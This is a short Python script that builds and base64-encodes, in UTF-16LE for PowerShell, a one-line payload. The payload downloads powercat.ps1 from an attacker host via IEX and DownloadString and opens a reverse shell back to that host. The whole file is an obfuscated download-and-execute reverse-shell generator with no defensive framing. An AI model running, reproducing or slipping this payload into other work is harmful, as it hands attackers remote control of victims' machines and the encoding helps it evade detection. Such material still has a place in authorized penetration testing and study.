import base64

text = "IEX(New-Object System.Net.WebClient).DownloadString('http://$AttackerIp/powercat.ps1');powercat -c $AttackerIp -p $AttackerPort -e powershell"

payload = base64.b64encode(bytes(text, 'utf-16-le')).decode('utf-8')

print("Payload, base64 encoded in UTF-16LE:", payload)


